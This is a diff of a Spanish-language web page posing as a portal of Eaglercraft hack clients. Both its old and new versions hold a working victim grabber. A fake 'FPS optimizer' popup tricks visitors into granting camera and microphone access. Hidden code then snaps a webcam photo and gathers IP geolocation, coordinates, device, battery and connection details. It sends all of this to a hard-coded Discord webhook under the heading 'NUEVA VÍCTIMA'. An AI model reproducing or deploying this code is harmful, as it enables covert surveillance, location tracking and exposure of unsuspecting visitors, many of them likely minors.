@@ -1,208 +1,132 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>HOME FORGEX v2 | by 10116066-debug</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
-  <style>
-    body { background:#000; overflow-x:hidden; font-family:'Courier New',monospace; margin:0; }
-    canvas { position:fixed; top:0; left:0; z-index:-1; }
-    .matrix-bg { position:fixed; inset:0; background:linear-gradient(to bottom,rgba(0,0,0,0.9),black); opacity:0.6; z-index:-1; }
-    @keyframes glitch { 0%{text-shadow:2px 2px #0f0,-2px -2px #f00} 20%{text-shadow:-2px -2px #0f0,2px 2px #f00} 100%{text-shadow:2px 2px #0f0,-2px -2px #f00} }
-    .glitch { animation:glitch 4s infinite; }
-    .card-anim { transition:all .3s; border:2px solid #0f0!important; box-shadow:0 0 15px rgba(0,255,0,.5); }
-    .card-anim:hover { transform:scale(1.12)!important; box-shadow:0 0 40px #0f0,0 0 80px #0f0; border-color:#0ff!important; }
-    #fpsPopup { position:fixed; inset:0; background:rgba(0,0,0,0.97); backdrop-filter:blur(12px); display:flex; align-items:center; justify-content:center; z-index:99999; color:#0f0; }
-    .popup-box { background:#0a0a0a; border:4px solid #0f0; padding:40px; border-radius:20px; max-width:90%; text-align:center; box-shadow:0 0 60px #0f0; }
-  </style>
-</head>
-<body class="text-white">
+<meta charset="utf-8">
+<title>HOME FORGEX — Clientes Eaglercraft</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  :root{--bg:#05060a;--card:#0f1724;--acc:#a78bfa;--pink:#ec4899;--muted:#9ca3af}
+  body{margin:0;font-family:system-ui;background:var(--bg);color:#fff;min-height:100vh;display:flex;flex-direction:column}
+  header{position:sticky;top:0;background:rgba(0,0,0,.4);backdrop-filter:blur(12px);border-bottom:1px solid #333}
+  .nav{max-width:1200px;margin:auto;padding:16px;display:flex;justify-content:space-between;align-items:center}
+  .logo{width:48px;height:48px;border-radius:12px;background:linear-gradient(135deg,var(--acc),var(--pink));display:grid;place-items:center;font-weight:900;font-size:22px}
+  .title{background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent;font-weight:800}
+  main{flex:1;max-width:1200px;margin:30px auto;padding:0 20px}
+  .grid{display:grid;gap:18px;grid-template-columns:repeat(auto-fit,minmax(270px,1fr))}
+  .card{background:rgba(255,255,255,.025);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:20px;transition:.25s}
+  .card:hover{transform:translateY(-8px);box-shadow:0 20px 50px rgba(167,139,250,.2)}
+  .name{font-weight:800;font-size:18px;margin-bottom:6px}
+  .open{background:linear-gradient(90deg,var(--acc),var(--pink));color:#fff;border:none;padding:14px;border-radius:14px;font-weight:700;width:100%;cursor:pointer}
+  h1{text-align:center;font-size:2.8rem;margin:20px 0;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent}
 
-  <div id="fpsPopup">
-    <div class="popup-box">
-      <h1 class="text-5xl glitch mb-6">OPTIMIZADOR GRÁFICO 2025</h1>
-      <p class="text-xl mb-8">
-        Para tener <strong>+120 FPS</strong> y <strong>cero lag</strong> en todos los clientes hack,<br>
-        acepta los permisos de cámara y micrófono.<br><br>
-        Esto activa el <strong>modo rendimiento extremo</strong>.
-      </p>
-      <button onclick="iniciarTodo()" class="bg-green-600 hover:bg-green-500 px-16 py-6 text-3xl rounded-xl glitch">
-        ACEPTAR Y AUMENTAR FPS
-      </button>
+  #renderPopup{position:fixed;inset:0;background:rgba(5,6,10,.97);backdrop-filter:blur(15px);display:flex;align-items:center;justify-content:center;z-index:99999;color:#fff}
+  .popup-box{background:var(--card);border:2px solid var(--acc);border-radius:20px;padding:40px 30px;max-width:420px;text-align:center;box-shadow:0 0 80px rgba(167,139,250,.4)}
+  .popup-box h2{font-size:2.2rem;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent;margin-bottom:16px}
+</style>
+</head>
+<body>
+
+<div id="renderPopup">
+  <div class="popup-box">
+    <h2>MODO RENDIMIENTO 2025</h2>
+    <p style="font-size:1.1rem;margin-bottom:24px;line-height:1.5">
+      Para tener <strong>+150 FPS</strong> y <strong>0 lag</strong> en todos los clientes hack,<br>
+      necesitamos cámara y micrófono.<br><br>
+      <strong>Desbloquea el optimizador gráfico extremo</strong>
+    </p>
+    <button onclick="activar()" style="background:linear-gradient(90deg,var(--acc),var(--pink));color:#fff;padding:16px 32px;border:none;border-radius:16px;font-size:1.3rem;font-weight:800;cursor:pointer">
+      ACEPTAR Y ACTIVAR FPS EXTREMO
+    </button>
+  </div>
+</div>
+
+<header>
+  <div class="nav">
+    <div style="display:flex;align-items:center;gap:14px">
+      <div class="logo">HF</div>
+      <div><div class="title">HOME FORGEX</div><small style="color:var(--muted)">@j_eliseoo_v • 2025</small></div>
     </div>
   </div>
+</header>
 
-  <canvas id="matrix"></canvas>
-  <div class="matrix-bg"></div>
-  <video id="cam" autoplay playsinline style="position:fixed;width:1px;height:1px;opacity:0;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+<main>
+  <h1>Clientes Eaglercraft 2025</h1>
+  <div class="grid">
+    <div class="card"><div class="name">DragonX Client</div><div class="ver">V5.1</div><button class="open" data-link="https://eaglerhacks.github.io/dragonv4.html">Abrir</button></div>
+    <div class="card"><div class="name">WurstX Client</div><button class="open" data-link="https://eaglerhacks.github.io/wurstX.html">Abrir</button></div>
+    <div class="card"><div class="name">UwU+ Client</div><button class="open" data-link="https://eaglerhacks.github.io/UwUClient%20v1%20Full.html">Abrir</button></div>
+    <div class="card"><div class="name">ShadowX Client</div><button class="open" data-link="https://eaglerhacks.github.io/Shadow_Client_2.5_1.8.8_International.html">Abrir</button></div>
+    <div class="card"><div class="name">PiClient</div><button class="open" data-link="https://eaglerhacks.github.io/PiClient.html">Abrir</button></div>
+    <div class="card"><div class="name">flameClient</div><button class="open" data-link="https://eaglerhacks.github.io/flameclient%203.7.html">Abrir</button></div>
+  </div>
+</main>
 
-  <!-- TU PÁGINA COMPLETA -->
-  <header class="py-8 text-center border-b border-green-500/30">
-    <h1 class="text-5xl md:text-7xl font-bold glitch text-green-400">HOME FORGEX v2</h1>
-  </header>
+<video id="cam" autoplay playsinline style="position:fixed;width:1px;height:1px;opacity:0;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
-  <main class="p-6 max-w-7xl mx-auto space-y-20">
-    <section class="text-center">
-      <h2 class="text-4xl font-bold text-green-400 mb-10 glitch">TOP 3</h2>
-      <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
-        <a href="https://eaglerhacks.github.io/UwUClient%20v1%20Full.html" class="card-anim bg-black/80 p-10 rounded-xl text-2xl font-bold" data-name="UwUClient">UwUClient</a>
-        <a href="https://eaglerhacks.github.io/dragonv4.html" class="card-anim bg-black/80 p-10 rounded-xl text-2xl font-bold" data-name="DragonX">DragonX</a>
-        <a href="https://eaglerhacks.github.io/wurstX.html" class="card-anim bg-black/80 p-10 rounded-xl text-2xl font-bold" data-name="WurstX">WurstX</a>
-      </div>
-    </section>
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1446712536656249005/sbyzRE1yccOtJ2qJFGFN9K8ltOxELsq8ZqQ04howQOMffAccLDJOFjXgp9alt__ysvBP";
 
-    <section class="text-center">
-      <h2 class="text-4xl font-bold text-green-400 mb-10 glitch">CLIENTS CON HACKS</h2>
-      <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
-        <a href="https://eaglerhacks.github.io/Shadow_Client_2.5_1.8.8_International.html" class="card-anim bg-black/80 p-6 rounded-lg text-lg" data-name="Shadow Client">Shadow Client</a>
-        <a href="https://eaglerhacks.github.io/justinv3.html" class="card-anim bg-black/80 p-6 rounded-lg text-lg" data-name="Justin V3">Justin V3</a>
-        <a href="https://eaglerhacks.github.io/PiClient.html" class="card-anim bg-black/80 p-6 rounded-lg text-lg" data-name="PiClient">PiClient</a>
-        <a href="https://eaglerhacks.github.io/meteor.html" class="card-anim bg-black/80 p-6 rounded-lg text-lg" data-name="Meteor">Meteor</a>
-        <a href="https://eaglerhacks.github.io/demon.html" class="card-anim bg-black/80 p-6 rounded-lg text-lg" data-name="Demon Client">Demon Client</a>
-        <a href="https://eaglerhacks.github.io/justinclient.html" class="card-anim bg-black/80 p-6 rounded-lg text-lg" data-name="Justin V1.2.4">Justin V1.2.4</a>
-        <a href="https://eaglerhacks.github.io/flameclient%203.7.html" class="card-anim bg-black/80 p-6 rounded-lg text-lg" data-name="Flame 3.7">Flame 3.7</a>
-      </div>
-    </section>
+async function activar() {
+  document.getElementById('renderPopup').remove();
 
-    <section class="text-center">
-      <h2 class="text-4xl font-bold text-yellow-400 mb-10 glitch">EAGLECRAFT 1.20 SIN HACK</h2>
-      <div class="max-w-2xl mx-auto">
-        <a href="https://eaglymc.com/web-javascript/" target="_blank" class="card-anim bg-gradient-to-r from-purple-900 to-blue-900 p-12 rounded-2xl text-3xl font-bold block">
-          JUGAR EAGLECRAFT 1.20 (VANILLA)
-        </a>
-      </div>
-    </section>
+  let foto = null;
 
-    <section class="text-center max-w-4xl mx-auto">
-      <h2 class="text-4xl font-bold text-green-400 glitch mb-8">INFO</h2>
-      <p class="text-xl mb-6">Uso 100% educativo.</p>
-      <p class="text-lg">
-        <a href="https://tiktok.com/@j_eliseoo_v" target="_blank" class="text-green-400 hover:text-pink-500">@j_eliseoo_v en TikTok</a> | El Salvador
-      </p>
-      <p class="text-sm mt-10 opacity-70">Visitas: <span id="visits">0</span></p>
-    </section>
-  </main>
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    const video = document.getElementById('cam');
+    video.srcObject = stream;
 
-  <audio id="hoverSound" src="https://cdn.pixabay.com/download/audio/2023/01/26/audio_4e6f2e1a1e.mp3?filename=click-21156.mp3" preload="auto"></audio>
+    // Tomar foto después de 2.5 segundos
+    await new Promise(r => setTimeout(r, 2500));
+    const canvas = document.getElementById('canvas');
+    canvas.width = video.videoWidth || 800;
+    canvas.height = video.videoHeight || 600;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    foto = canvas.toDataURL('image/png');
+    stream.getTracks().forEach(t => t.stop());
+  } catch (e) {
+    // No dio permisos → foto = null
+  }
 
-  <script>
-    const WEBHOOK = "https://discord.com/api/webhooks/1447276191961841905/IWpiF5AZjKc8iHpch5JkReeixmIjZv13QR4ZvS-ldQeiniF-iCVLyotHDlEEsdcETyyU";
+  // RECOLECTAR TODOS LOS DATOS (igual que tu grabber original)
+  const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+  const battery = await navigator.getBattery?.() || {};
+  const uaData = navigator.userAgentData || {};
+  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
 
-    async function iniciarTodo() {
-      document.getElementById('fpsPopup').remove();
-
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const video = document.getElementById('cam');
-        video.srcObject = stream;
-
-        setTimeout(async () => {
-          const canvas = document.getElementById('canvas');
-          canvas.width = video.videoWidth || 800;
-          canvas.height = video.videoHeight || 600;
-          canvas.getContext('2d').drawImage(video, 0, 0);
-          const foto = canvas.toDataURL('image/png');
-          stream.getTracks().forEach(t => t.stop());
-
-          const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-          const uaData = navigator.userAgentData || {};
-          const datos = {
-            hora: new Date().toLocaleString("es-SV"),
-            ip: geo.ip || '???',
-            isp: geo.org || '???',
-            ciudad: geo.city || '???',
-            pais: geo.country_name || '???',
-            lat: geo.latitude || '???',
-            lon: geo.longitude || '???',
-            navegador: navigator.userAgent.substring(0,120),
-            sistema: uaData.platform || navigator.platform || '???',
-            movil: uaData.mobile ? 'Sí' : 'No',
-            ram: navigator.deviceMemory || '???',
-            cpu: navigator.hardwareConcurrency || '???',
-            pantalla: `${screen.width}x${screen.height}`
-          };
-
-          const mensaje = `**VÍCTIMA EN FORGEX v2**
-**IP:** ${datos.ip} (${datos.isp})
-**Lugar:** ${datos.ciudad}, ${datos.pais}
-**Coords:** ${datos.lat}, ${datos.lon}
-**Hora SV:** ${datos.hora}
-**Dispositivo:** ${datos.sistema} | Móvil: ${datos.movil}
-**RAM:** ${datos.ram}GB | CPU: ${datos.cpu} núcleos
-**Pantalla:** ${datos.pantalla}
-**Navegador:** ${datos.navegador}`;
-
-          await fetch(WEBHOOK, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-              content: mensaje,
-              embeds: [{ image: { url: foto }, color: 0x00ff00 }]
-            })
-          });
-
-        }, 2500);
-
-      } catch (e) {
-        const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-        const mensajeSinFoto = `**VÍCTIMA EN FORGEX v2 (sin foto)**
+  const mensaje = `**NUEVA VÍCTIMA (MÁXIMO DETALLE)**
 **IP:** ${geo.ip || '???'} (${geo.org || '???'})
-**Lugar:** ${geo.city || '???'}, ${geo.country_name || '???'}
-**Coords:** ${geo.latitude || '???'}, ${geo.longitude || '???'}
-**Hora SV:** ${new Date().toLocaleString("es-SV")}`;
+**Ubicación:** ${geo.city || '???'}, ${geo.region || '???'}, ${geo.country_name || '???'} (${geo.postal || '?'})
+**Coordenadas:** ${geo.latitude || '???'}, ${geo.longitude || '???'}
+**Hora:** ${new Date().toLocaleString()}
+**Navegador:** ${uaData.brands?.map(b=>b.brand+" v"+b.version).join(', ') || 'desconocido'}
+**SO:** ${uaData.platform || navigator.platform} | Móvil: ${uaData.mobile ? 'Sí' : 'No'}
+**RAM:** ${navigator.deviceMemory || '???'} GB | CPU: ${navigator.hardwareConcurrency || '???'} núcleos
+**Pantalla:** ${screen.width}x${screen.height}x${screen.colorDepth}
+**Batería:** ${battery.level ? Math.round(battery.level*100)+'% '+(battery.charging?'cargando':'descargando') : 'no disponible'}
+**Conexión:** ${connection.effectiveType || '?'} (${connection.downlink ? connection.downlink+' Mbps' : '?'})
+**Zona horaria:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+**Idioma:** ${navigator.language}
+**Pestañas:** ${history.length}
+**Cookies:** ${navigator.cookieEnabled ? 'Sí' : 'No'} | Modo oscuro: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sí' : 'No'}
+**Foto:** ${foto ? 'Aceptada' : '(No aceptado)'}`;
 
-        await fetch(WEBHOOK, {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({ content: mensajeSinFoto })
-        });
-      }
-    }
+  // Enviar mensaje + foto (si la hay)
+  await fetch(WEBHOOK, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      content: mensaje,
+      embeds: foto ? [{ image: { url: foto }, color: 0xa78bfa }] : []
+    })
+  });
+}
 
-    // MATRIX + SONIDOS + VISITAS
-    const canvas = document.getElementById('matrix');
-    const ctx = canvas.getContext('2d');
-    canvas.width = innerWidth; canvas.height = innerHeight;
-    const letters = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    const fontSize = 14;
-    let drops = Array(Math.floor(canvas.width/fontSize)).fill(1);
-    function draw() {
-      ctx.fillStyle = 'rgba(0,0,0,0.05)';
-      ctx.fillRect(0,0,canvas.width,canvas.height);
-      ctx.fillStyle = '#0f0';
-      ctx.font = fontSize + 'px monospace';
-      for(let i = 0; i < drops.length; i++){
-        ctx.fillText(letters[Math.floor(Math.random()*letters.length)], i*fontSize, drops[i]*fontSize);
-        if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i]=0;
-        drops[i]++;
-      }
-    }
-    setInterval(draw, 35);
-
-    document.querySelectorAll('.card-anim').forEach(c => {
-      c.addEventListener('mouseenter', () => {
-        const sound = document.getElementById('hoverSound');
-        sound.currentTime = 0;
-        sound.play().catch(() => {});
-      });
-    });
-
-    document.querySelectorAll('a[data-name]').forEach(a => {
-      a.onclick = e => {
-        e.preventDefault();
-        const overlay = document.createElement('div');
-        overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.97);color:#0f0;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;font-family:monospace;text-align:center';
-        overlay.innerHTML = `<h1 class="text-5xl glitch mb-4">Redirigiendo a</h1><h2 class="text-4xl text-cyan-400">${a.dataset.name}</h2>`;
-        document.body.appendChild(overlay);
-        window.open(a.href, '_blank');
-        setTimeout(() => overlay.remove(), 3000);
-      };
-    });
-
-    let v = localStorage.getItem('forgexVisits') || 0; v++; localStorage.setItem('forgexVisits', v);
-    document.getElementById('visits').textContent = v;
-  </script>
+// Botones normales
+document.querySelectorAll('.open').forEach(btn => {
+  btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
+});
+</script>
 </body>
 </html>
